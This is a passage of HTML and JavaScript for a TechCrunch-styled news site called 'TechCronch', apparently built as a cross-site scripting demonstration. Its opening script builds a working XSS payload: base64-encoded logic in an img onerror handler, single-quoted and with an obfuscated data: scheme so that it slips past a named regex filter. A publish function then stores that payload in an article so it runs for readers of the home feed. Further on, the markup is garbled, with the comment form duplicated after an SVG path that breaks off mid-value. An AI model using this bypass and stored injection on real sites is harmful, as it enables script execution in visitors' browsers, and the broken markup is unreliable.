             const svgVector = `<svg xmlns="http://www.w3.org/2000/svg" style="display:none">
                <image href="x" onerror='eval(atob("${btoa(htmlContent.replace(/<script>|<\/script>/g, ''))}"))' />
             </svg>`;

             // Actually, let's stick to the previous sophisticated payload but wrapped in a way that bypasses.
             // We will use the 'srcdoc' attribute of an iframe if possible, but iframe is blocked.
             // Let's use the Single Quote Bypass on a standard IMG tag, which is not blocked.
             
             // Re-encoding the complex logic
             const payloadLogic = htmlContent.replace(/<script>|<\/script>/g, '');
             const b64Logic = btoa(unescape(encodeURIComponent(payloadLogic)));
             
             // The Payload: An image that executes JS on error, using single quotes to bypass the regex
              // We also Obfuscate the 'data:' scheme to bypass the data URI regex.
              const payload = `<img src=x style="display:none" onerror='
                 var s=document.createElement("script");
                 // Obfuscated "data:text/javascript;base64,"
                 var scheme = "d" + "ata:text/javascript;base64,"; 
                 s.src = scheme + "${b64Logic}";
                 document.body.appendChild(s);
              '>
              <div class="p-4 bg-red-900/20 border border-red-500 rounded text-red-500 font-mono text-sm">
                 <strong>[SYSTEM COMPROMISED]</strong><br>
                 GuardianSDK Filter Bypassed via Single-Quote Attribute Injection & String Concatenation.<br>
                 Executing Memory-Resident Payload...
              </div>`;
             
             document.getElementById('phish-output').value = payload;
             document.getElementById('phish-preview').innerHTML = payload;
             
             const analysisList = document.getElementById('phish-analysis-list');
             analysisList.innerHTML = '';
             const item = document.createElement('li');
             item.innerHTML = "<strong>Advanced Bypass (Polyglot):</strong> Exploits Regex Weakness (Double Quote Expectation).<br>Payload uses <code>onerror='...'</code> (Single Quotes) to evade <code>/on\\w+=\"[^\"]*\"/</code> filter.<br><br><strong>Status:</strong> <span class='text-green-400'>ACTIVE & UNDETECTED</span>";
             analysisList.appendChild(item);
             
             document.getElementById('phish-analysis').classList.remove('hidden');
             showToast('Advanced Steganography Payload Generated!', 'success');
        },

publishToFeed: async function() {
             const payload = document.getElementById('phish-output').value;
             if (!payload) {
                 showToast('Generate or run a demo first!', 'error');
                 return;
             }

             const article = {
                 title: "Security Alert: Malicious Content Detected",
                 category: "Security",
                 image: "https://via.placeholder.com/800x400?text=MALWARE",
                 excerpt: payload, // Injecting payload into excerpt to trigger on home view
                 content: payload + "<p>This is a demonstration of stored XSS.</p>",
                 authorName: "Hacker",
                 authorAvatar: "https://ui-avatars.com/api/?name=Hacker&background=000&color=fff",
                 readTime: "0 min read"
             };

             await dataSdk.create(article);
             showToast('Malicious Article Published!', 'error');
             
             // Redirect to home to witness the chaos
             setTimeout(() => {
                 location.hash = '#';
                 // Force reload if already on hash
                 if (location.hash === '#') {
                     handleRoute();
                 }
             }, 1000);
         }
     }
 };
  </script>
  <script src="_sdk/element_sdk.js"></script>
  <script src="_sdk/data_sdk.js"></script>
  <script src="_sdk/seed_data.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet" />
  <style>
    body {
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    }
    
    /* TechCronch Branding */
    .techcronch-logo {
      color: #00d084;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      letter-spacing: -1px;
    }

    .neon-border {
      box-shadow: 0 0 10px rgba(0, 208, 132, 0.2);
      border: 1px solid rgba(0, 208, 132, 0.3);
    }
    
    /* View Transitions */
    .view-section {
      transition: opacity 0.3s ease-in-out;
    }
    .hidden {
      display: none !important;
    }

    /* Article Typography */
    .prose h3 { font-size: 1.5rem; font-weight: 700; margin-top: 2rem; margin-bottom: 1rem; }
    .prose p { margin-bottom: 1.25rem; line-height: 1.75; font-size: 1.125rem; color: #374151; }
    .dark .prose p { color: #d1d5db; }
    .prose blockquote { border-left: 4px solid #00d084; padding-left: 1rem; font-style: italic; color: #4b5563; margin: 2rem 0; }
    .dark .prose blockquote { color: #9ca3af; }
    
    /* Global Button Active State */
    button:active, .article-card:active, .cursor-pointer:active {
        transform: scale(0.98);
        transition: transform 0.05s;
    }

    /* Animations */
    @keyframes ticker {
      0% { transform: translateX(0); }
      100% { transform: translateX(-50%); }
    }
    .ticker-content { animation: ticker 40s linear infinite; white-space: nowrap; }
    .ticker-content:hover { animation-play-state: paused; }
    
    .article-card { transition: all 0.3s ease; }
    .article-card:hover { transform: translateY(-4px); box-shadow: 0 12px 24px rgba(0, 0, 0, 0.15); }
    
    .mobile-menu { transform: translateX(-100%); transition: transform 0.3s ease; }
    .mobile-menu.active { transform: translateX(0); }
    
    /* Toast */
    .toast {
      position: fixed; top: 20px; right: 20px; padding: 16px 24px; border-radius: 8px;
      background: #00d084; color: black; font-weight: 600;
      box-shadow: 0 0 15px rgba(0, 208, 132, 0.4);
      z-index: 9999; animation: slideIn 0.3s ease;
    }
    @keyframes slideIn { from { transform: translateX(400px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
    .toast.error { background: #ff0055; color: white; box-shadow: 0 0 15px rgba(255, 0, 85, 0.4); }
  </style>
 </head>
 <body class="h-full w-full bg-white dark:bg-[#050507] text-gray-900 dark:text-gray-100 transition-colors duration-300">
  
  <!-- Header -->
  <header class="sticky top-0 z-50 bg-white/90 dark:bg-[#050507]/90 backdrop-blur-md border-b border-gray-200 dark:border-gray-800 transition-colors duration-300">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
      <div class="flex items-center justify-between h-16">
        <!-- Logo -->
        <div class="flex-shrink-0 flex items-center gap-2 cursor-pointer" onclick="location.hash='#home'">
            <div class="w-10 h-10 rounded bg-[#00d084] flex items-center justify-center text-white font-bold text-lg">TC</div>
            <span class="text-2xl font-black tracking-tighter techcronch-logo">TechCronch</span>
          </div>

        <!-- Desktop Nav -->
        <div class="hidden md:flex items-center space-x-1">
            <a href="#home" data-ui-enhance data-ui-tooltip="Return to Home" data-ui-analytics="nav_home" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">Home</a>
            <a href="#market" data-ui-enhance data-ui-tooltip="Live Market Data" data-ui-analytics="nav_market" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">Market Data</a>
            <a href="https://techcrunch.com" target="_blank" data-ui-enhance data-ui-tooltip="TechCrunch Events" data-ui-analytics="nav_events" class="px-3 py-2 rounded-md text-sm font-bold text-[#00d084] hover:bg-[#00d084] hover:text-white transition-colors">Events</a>
            <a href="#category/Startups" data-ui-enhance data-ui-tooltip="Startup News" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">Startups</a>
            <a href="#category/AI" data-ui-enhance data-ui-tooltip="Artificial Intelligence" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">AI</a>
            <a href="#category/Crypto" data-ui-enhance data-ui-tooltip="Cryptocurrency" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">Crypto</a>
            <a href="#category/Security" data-ui-enhance data-ui-tooltip="Cyber Security" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">Security</a>
            <button onclick="if(window.showToast) showToast('Subscribed to newsletter!', 'success')" data-ui-enhance data-ui-loading="true" data-ui-analytics="subscribe_header" data-ui-tooltip="Get Daily Updates" class="px-3 py-2 rounded-md text-sm font-medium bg-brand text-white shadow-lg hover:shadow-cyan-500/50 transition-all ml-4">Subscribe</button>
            <button onclick="toggleAdminPanel()" data-ui-enhance data-ui-tooltip="Admin Access" data-ui-shortcut="Alt+L" class="px-3 py-2 rounded-md text-sm font-medium border border-gray-300 dark:border-gray-600 hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors ml-2">Login</button>
        </div>

        <!-- Right Side Icons -->
        <div class="flex items-center gap-4">
          <button onclick="toggleDarkMode()" data-ui-enhance data-ui-tooltip="Toggle Dark Mode" data-ui-shortcut="Alt+D" class="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
            <span id="moon-icon" class="dark:hidden">üåô</span>
            <span id="sun-icon" class="hidden dark:inline">‚òÄÔ∏è</span>
          </button>
          
          <!-- Mobile Menu Button -->
          <button onclick="toggleMobileMenu()" class="md:hidden p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" /></svg>
          </button>
        </div>
      </div>
    </div>
  </header>

  <!-- Mobile Menu -->
  <div id="mobile-menu-overlay" class="fixed inset-0 bg-black/50 z-40 hidden" onclick="toggleMobileMenu()"></div>
  <div id="mobile-menu" class="mobile-menu fixed top-0 left-0 bottom-0 w-72 bg-white dark:bg-[#1a1a1d] z-50 overflow-y-auto shadow-xl">
    <div class="p-6">
     <div class="flex items-center justify-between mb-8">
      <h2 class="text-xl font-black text-[#00d084]">Menu</h2>
      <button onclick="toggleMobileMenu()" class="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-lg"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg></button>
     </div>
     <nav class="space-y-2">
       <a href="#" onclick="toggleMobileMenu()" class="block px-4 py-3 rounded-lg font-semibold hover:bg-gray-100 dark:hover:bg-gray-800">Home</a>
       <a href="#category/Startups" onclick="toggleMobileMenu()" class="block px-4 py-3 rounded-lg font-semibold hover:bg-gray-100 dark:hover:bg-gray-800">Startups</a>
       <a href="#category/AI" onclick="toggleMobileMenu()" class="block px-4 py-3 rounded-lg font-semibold hover:bg-gray-100 dark:hover:bg-gray-800">AI</a>
       <a href="#market" onclick="toggleMobileMenu()" class="block px-4 py-3 rounded-lg font-semibold hover:bg-gray-100 dark:hover:bg-gray-800">Market Data</a>
       <a href="https://techcrunch.com" target="_blank" onclick="toggleMobileMenu()" class="block px-4 py-3 rounded-lg font-semibold hover:bg-gray-100 dark:hover:bg-gray-800 text-[#00d084]">Events</a>
       <a href="#category/Security" onclick="toggleMobileMenu()" class="block px-4 py-3 rounded-lg font-semibold hover:bg-gray-100 dark:hover:bg-gray-800">Security</a>
     </nav>
     <div class="mt-8 pt-6 border-t border-gray-200 dark:border-gray-700">
       <button onclick="toggleAdminPanel(); toggleMobileMenu();" class="w-full bg-gray-100 dark:bg-gray-800 font-bold px-4 py-3 rounded-lg">Admin Panel</button>
     </div>
    </div>
  </div>

  <!-- Breaking News Ticker -->
  <div class="bg-gradient-to-r from-red-600 to-pink-600 border-b border-red-700">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-2">
     <div class="flex items-center gap-3">
       <span class="flex items-center gap-2 text-xs font-black uppercase tracking-wider flex-shrink-0 text-white">
         <span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-white"></span></span>
         LIVE
       </span>
      <div class="overflow-hidden flex-1">
       <div class="ticker-content inline-block text-white text-sm font-semibold" id="breaking-news">
         <!-- Populated via JS -->
       </div>
      </div>
     </div>
    </div>
  </div>

  <!-- MAIN CONTAINER -->
  <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 min-h-screen">
    
    <!-- VIEW: HOME -->
    <div id="view-home" class="view-section">
        <!-- Featured Hero (Top Story) -->
        <div id="home-hero" class="mb-12 relative rounded-2xl overflow-hidden h-[500px] group cursor-pointer hidden shadow-2xl">
            <!-- Rendered via JS -->
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
            <!-- Main Feed -->
            <div class="lg:col-span-8">
                 <div class="flex items-center justify-between mb-6">
                    <h2 class="text-2xl font-black flex items-center gap-2">
                        <span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>
                        Latest News <span class="text-sm text-gray-500 font-normal">(<span id="total-count">0</span>)</span>
                    </h2>
                    <div class="flex gap-2">
                        <button class="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded text-gray-500"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg></button>
                    </div>
                 </div>
                 <div id="articles-container" class="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <!-- Articles Rendered Here -->
                 </div>
                 <div id="empty-state" class="text-center py-20 hidden">
                    <h3 class="text-xl font-bold mb-2">No Stories Yet</h3>
                    <button onclick="SeedData.init()" class="text-brand hover:underline">Generate Demo Data</button>
                </div>
            </div>

            <!-- Sidebar Widgets -->
            <div class="lg:col-span-4 space-y-8">
                <!-- Market Widget (Mini) -->
                <div class="bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 p-6 shadow-sm">
                    <h3 class="font-bold mb-4 flex items-center justify-between">
                        <span>Market Movers</span>
                        <span class="text-xs text-green-500 font-mono">LIVE</span>
                    </h3>
                    <div id="home-market-widget" class="space-y-4">
                        <!-- JS Populated -->
                        <div class="animate-pulse space-y-3">
                            <div class="h-10 bg-gray-100 dark:bg-gray-800 rounded"></div>
                            <div class="h-10 bg-gray-100 dark:bg-gray-800 rounded"></div>
                            <div class="h-10 bg-gray-100 dark:bg-gray-800 rounded"></div>
                        </div>
                    </div>
                    <a href="#market" class="block mt-4 text-center text-xs font-bold text-brand hover:underline">View All Markets ‚Üí</a>
                </div>

                <!-- Trending Topics -->
                <div class="bg-gray-50 dark:bg-gray-800/50 rounded-xl p-6 border border-gray-200 dark:border-gray-700">
                    <h3 class="font-bold mb-4">Trending Topics</h3>
                    <div class="flex flex-wrap gap-2">
                        <span class="px-3 py-1 bg-white dark:bg-gray-700 rounded-full text-xs font-bold border border-gray-200 dark:border-gray-600 hover:border-brand cursor-pointer transition-colors">#ArtificialIntelligence</span>
                        <span class="px-3 py-1 bg-white dark:bg-gray-700 rounded-full text-xs font-bold border border-gray-200 dark:border-gray-600 hover:border-brand cursor-pointer transition-colors">#CryptoMarkets</span>
                        <span class="px-3 py-1 bg-white dark:bg-gray-700 rounded-full text-xs font-bold border border-gray-200 dark:border-gray-600 hover:border-brand cursor-pointer transition-colors">#SaaS</span>
                        <span class="px-3 py-1 bg-white dark:bg-gray-700 rounded-full text-xs font-bold border border-gray-200 dark:border-gray-600 hover:border-brand cursor-pointer transition-colors">#CyberSecurity</span>
                        <span class="px-3 py-1 bg-white dark:bg-gray-700 rounded-full text-xs font-bold border border-gray-200 dark:border-gray-600 hover:border-brand cursor-pointer transition-colors">#VentureCapital</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- VIEW: ARTICLE DETAIL -->
    <div id="view-article" class="view-section hidden">
        <!-- Floating Share Sidebar (Desktop) -->
        <div id="floating-share-sidebar" class="hidden lg:flex fixed left-8 top-1/2 -translate-y-1/2 flex-col gap-4 z-40 bg-white dark:bg-gray-800 p-3 rounded-2xl shadow-xl border border-gray-100 dark:border-gray-700 transition-opacity duration-300 pointer-events-auto">
            <!-- Injected via JS -->
        </div>

        <button onclick="window.history.back()" class="mb-6 flex items-center gap-2 text-sm font-semibold text-gray-500 hover:text-brand transition-colors">
            ‚Üê Back to feed
        </button>
        
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-12">
            <!-- Main Content -->
            <article class="lg:col-span-8">
                <div class="mb-8">
                    <span id="detail-category" class="px-3 py-1 rounded-full bg-cyan-100 dark:bg-cyan-900/30 text-cyan-700 dark:text-cyan-300 text-xs font-bold uppercase tracking-wider">Category</span>
                    <h1 id="detail-title" class="mt-4 text-3xl sm:text-5xl md:text-6xl font-black leading-tight tracking-tight mb-6">Title</h1>
                    
                    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-6 border-b border-gray-100 dark:border-gray-800 pb-8">
                        <div class="flex items-center gap-4">
                            <a id="detail-author-link" href="#" class="flex items-center gap-3 group">
                                <img id="detail-author-avatar" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="w-12 h-12 rounded-full bg-gray-200 object-cover border-2 border-transparent group-hover:border-brand transition-all" />
                                <div>
                                    <p id="detail-author-name" class="text-sm font-bold group-hover:text-brand">Author Name</p>
                                    <p id="detail-date" class="text-xs text-gray-500">Date ‚Ä¢ Read Time</p>
                                </div>
                            </a>
                            <div id="detail-author-social" class="flex gap-2 items-center"></div>
                            <button onclick="showToast('Audio playback started...', 'info')" class="flex items-center gap-2 px-3 py-1.5 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors text-xs font-bold">
                                <span>üîä</span> Listen
                            </button>
                        </div>
                        
                        <div id="share-buttons-container" class="flex flex-wrap gap-2">
                            <!-- Rendered via JS -->
                        </div>
                    </div>
                </div>

                <div class="rounded-2xl overflow-hidden mb-10 shadow-2xl relative group">
                    <img id="detail-image" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="w-full h-[500px] object-cover transition-transform duration-700 group-hover:scale-105">
                </div>

                <div id="detail-content" class="prose dark:prose-invert max-w-none text-xl leading-relaxed text-gray-800 dark:text-gray-300">
                    <!-- Content -->
                </div>
                
                <!-- Engagement Bar -->
                <div class="mt-12 py-6 border-y border-gray-100 dark:border-gray-800 flex items-center justify-between">
                    <div class="flex gap-4">
                        <button id="article-like-btn" onclick="likeArticle()" data-ui-enhance data-ui-tooltip="Like Article" data-ui-analytics-event="article_like" class="flex items-center gap-2 text-gray-500 hover:text-red-500 transition-colors group">
                            <svg class="w-6 h-6 group-hover:fill-red-500 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"></path></svg>
                            <span id="article-like-count" class="font-bold">...</span>
                        </button>
                        <button class="flex items-center gap-2 text-gray-500 hover:text-blue-500 transition-colors">
                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path></svg>
                            <span class="font-bold">84</span>
                        </button>
                    </div>
                    <button onclick="if(window.showToast) window.showToast('Reporting interface opened', 'info')" data-ui-enhance data-ui-tooltip="Report Content" class="text-gray-500 hover:text-brand transition-colors font-bold text-sm">Report Issue</button>
                </div>

                <!-- Comments Section -->
                <div class="mt-12 pt-8">
                    <h3 class="text-2xl font-black mb-8 flex items-center gap-2">
                        Discussion
                        <span class="text-sm font-normal text-gray-500 px-2 py-1 bg-gray-100 dark:bg-gray-800 rounded-full">84</span>
                    </h3>
                    
                    <!-- Comment Form -->
                    <div id="comment-form-container" class="mb-10 transition-all duration-500 ease-in-out">
                        <!-- Collapsed State -->
                        <div id="comment-collapsed" onclick="expandCommentForm()" class="bg-gray-100 dark:bg-gray-800 rounded-xl p-4 cursor-text hover:bg-gray-200 dark:hover:bg-gray-700 transition-all duration-300 ease-in-out flex items-center gap-4 group">
                             <div class="w-10 h-10 rounded-full bg-gradient-to-br from-brand to-blue-500 flex items-center justify-center text-white font-bold shadow-md group-hover:scale-110 transition-transform">G</div>
                             <span class="text-gray-500 font-medium">Add a comment...</span>
                        </div>
                        <!-- Expanded State -->
                        <div id="comment-expanded" class="hidden opacity-0 transform translate-y-4 scale-95 transition-all duration-300">
                            <div class="p-1 rounded-2xl bg-gradient-to-br from-cyan-500 to-blue-500 mt-4 shadow-xl">
                                <div class="bg-white dark:bg-gray-900 rounded-xl p-6">
                                    <textarea id="comment-input" rows="5" class="w-full p-4 bg-gray-50 dark:bg-gray-800 border-none rounded-xl focus:ring-2 focus:ring-brand/20 outline-none transition-all resize-none text-lg" placeholder="Share your thoughts..."></textarea>
                                    <div class="mt-4 flex justify-between items-center">
                                        <div class="flex gap-2">
                                             <button class="text-gray-400 hover:text-brand p-2 rounded hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors" title="Bold"><b>B</b></button>
                                             <button class="text-gray-400 hover:text-brand p-2 rounded hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors" title="Italic"><i>I</i></button>
                                             <button class="text-gray-400 hover:text-brand p-2 rounded hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors" title="Link">üîó</button>
                                        </div>
                                        <div class="flex gap-3">
                                <button onclick="cancelComment()" class="px-4 py-2 text-gray-500 hover:text-gray-700 dark:hover:text-gray-300 font-bold transition-colors">Cancel</button>
                                <button onclick="submitComment()" data-ui-enhance data-ui-loading="true" class="px-8 py-2.5 bg-brand text-black font-bold rounded-lg hover:shadow-lg hover:shadow-cyan-500/30 transition-all transform hover:-translate-y-0.5">Post Comment</button>
                            </div>
                        </div>
                        
                        <!-- Social Login (OAuth Integration) -->
                        <div class="mt-6 border-t border-gray-200 dark:border-gray-800 pt-4">
                            <p class="text-xs text-gray-500 mb-3 font-bold uppercase tracking-wider">Or sign in with</p>
                            <div class="flex gap-3">
                                <button class="p-2 rounded-full bg-[#1877F2] text-white hover:opacity-90 transition-opacity" title="Sign in with Facebook"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-
                        <!-- Collapsed State -->
                        <div id="comment-collapsed" onclick="expandCommentForm()" class="bg-gray-100 dark:bg-gray-800 rounded-xl p-4 cursor-text hover:bg-gray-200 dark:hover:bg-gray-700 transition-all duration-300 ease-in-out flex items-center gap-4 group">
                             <div class="w-10 h-10 rounded-full bg-gradient-to-br from-brand to-blue-500 flex items-center justify-center text-white font-bold shadow-md group-hover:scale-110 transition-transform">G</div>
                             <span class="text-gray-500 font-medium">Add a comment...</span>
                        </div>

                        <!-- Expanded State -->
                        <div id="comment-expanded" class="hidden opacity-0 transform translate-y-4 scale-95 transition-all duration-300">
                            <div class="p-1 rounded-2xl bg-gradient-to-br from-cyan-500 to-blue-500 mt-4 shadow-xl">
                                <div class="bg-white dark:bg-gray-900 rounded-xl p-6">
                                    <textarea id="comment-input" rows="5" class="w-full p-4 bg-gray-50 dark:bg-gray-800 border-none rounded-xl focus:ring-2 focus:ring-brand/20 outline-none transition-all resize-none text-lg" placeholder="Share your thoughts..."></textarea>
                                    <div class="mt-4 flex justify-between items-center">
                                        <div class="flex gap-2">
                                             <button class="text-gray-400 hover:text-brand p-2 rounded hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors" title="Bold"><b>B</b></button>
                                             <button class="text-gray-400 hover:text-brand p-2 rounded hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors" title="Italic"><i>I</i></button>
                                             <button class="text-gray-400 hover:text-brand p-2 rounded hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors" title="Link">üîó</button>
                                        </div>
                                        <div class="flex gap-3">
                                <button onclick="cancelComment()" class="px-4 py-2 text-gray-500 hover:text-gray-700 dark:hover:text-gray-300 font-bold transition-colors">Cancel</button>
                                <button onclick="submitComment()" data-ui-enhance data-ui-loading="true" class="px-8 py-2.5 bg-brand text-black font-bold rounded-lg hover:shadow-lg hover:shadow-cyan-500/30 transition-all transform hover:-translate-y-0.5">Post Comment</button>
                            </div>
                        </div>
                        
                        <!-- Social Login (OAuth Integration) -->
                        <div class="mt-6 border-t border-gray-200 dark:border-gray-800 pt-4">
                            <p class="text-xs text-gray-500 mb-3 font-bold uppercase tracking-wider">Or sign in with</p>
                            <div class="flex gap-3">
                                <button class="p-2 rounded-full bg-[#1877F2] text-white hover:opacity-90 transition-opacity" title="Sign in with Facebook"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.791-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></button>
                                <button class="p-2 rounded-full bg-[#1DA1F2] text-white hover:opacity-90 transition-opacity" title="Sign in with Twitter"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/></svg></button>
                                <button class="p-2 rounded-full bg-[#DB4437] text-white hover:opacity-90 transition-opacity" title="Sign in with Google"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12.545 10.239v3.821h5.445c-.712 2.315-2.647 3.972-5.445 3.972-3.332 0-6.033-2.701-6.033-6.032s2.701-6.032 6.033-6.032c1.498 0 2.866.549 3.921 1.453l2.814-2.814C17.503 2.988 15.139 2 12.545 2 7.021 2 2.543 6.477 2.543 12s4.478 10 10.002 10c8.396 0 10.249-7.85 9.426-11.748l-9.426-.013z"/></svg></button>
                                <button class="p-2 rounded-full bg-[#0077B5] text-white hover:opacity-90 transition-opacity" title="Sign in with LinkedIn"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></button>
                            </div>
                        </div>
                        </div>
                    </div>

                    <!-- Comments List -->
                    <div id="comments-list" class="space-y-8">
                        <!-- Rendered via JS -->
                    </div>
                </div>
            </article>

            <!-- Sidebar -->
            <aside class="lg:col-span-4 space-y-12">
                <!-- Newsletter Widget -->
                <div class="bg-gradient-to-br from-gray-900 to-black p-8 rounded-2xl text-white relative overflow-hidden">
                    <div class="absolute top-0 right-0 w-32 h-32 bg-brand/20 rounded-full blur-3xl -mr-10 -mt-10"></div>
                    <h3 class="text-2xl font-black mb-2 relative z-10">The Daily Crunch</h3>
                    <p class="text-gray-400 mb-6 text-sm relative z-10">Get the top tech stories delivered to your inbox every morning. Join 50,000+ smart readers.</p>
                    <div class="space-y-3 relative z-10">
                        <input type="email" placeholder="Your email address" class="w-full px-4 py-3 rounded-lg bg-white/10 border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-brand transition-colors">
                        <button onclick="showToast('Subscribed!', 'success')" class="w-full py-3 bg-brand text-black font-bold rounded-lg hover:bg-cyan-300 transition-colors">Subscribe Free</button>
                    </div>
                    <p class="text-[10px] text-gray-500 mt-4 text-center">No spam. Unsubscribe anytime.</p>
                </div>

                <!-- Related Articles -->
                <div class="bg-gray-50 dark:bg-gray-800/30 p-6 rounded-2xl border border-gray-200 dark:border-gray-700">
                    <h3 class="text-lg font-black mb-6 flex items-center gap-2 border-b border-gray-200 dark:border-gray-700 pb-4">
                        <span>‚ö° Recommended For You</span>
                    </h3>
                    <div id="related-articles-list" class="space-y-6">
                        <!-- Rendered via JS -->
                    </div>
                </div>
            </aside>
        </div>
    </div>

    <!-- VIEW: AUTHOR DETAIL -->
    <div id="view-author" class="view-section hidden">
        <div class="bg-gray-50 dark:bg-gray-800/50 rounded-2xl p-8 mb-12 text-center border border-gray-200 dark:border-gray-700">
            <img id="author-page-avatar" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="w-32 h-32 rounded-full mx-auto mb-4 border-4 border-white dark:border-gray-900 shadow-xl" />
            <h1 id="author-page-name" class="text-3xl font-black mb-2">Author Name</h1>
            <p id="author-page-role" class="text-brand font-bold uppercase tracking-wider text-sm mb-4">Role</p>
            <p id="author-page-bio" class="max-w-2xl mx-auto text-gray-600 dark:text-gray-400 text-lg">Bio goes here...</p>
        </div>

        <h2 class="text-2xl font-bold mb-6">Latest Stories</h2>
        <div id="author-articles-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <!-- Rendered via JS -->
        </div>
    </div>
    
    <!-- VIEW: CATEGORY -->
    <div id="view-category" class="view-section hidden">
        <div class="mb-8">
            <h1 id="category-title" class="text-4xl font-black mb-2">Category</h1>
